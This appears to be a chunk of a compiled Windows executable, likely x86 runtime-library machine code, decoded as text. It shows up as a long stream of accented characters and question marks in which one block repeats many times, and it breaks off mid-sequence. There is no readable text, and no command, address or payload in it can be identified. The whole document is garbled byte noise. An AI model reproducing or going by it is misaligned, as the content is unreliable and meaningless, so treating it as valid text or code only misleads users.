+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
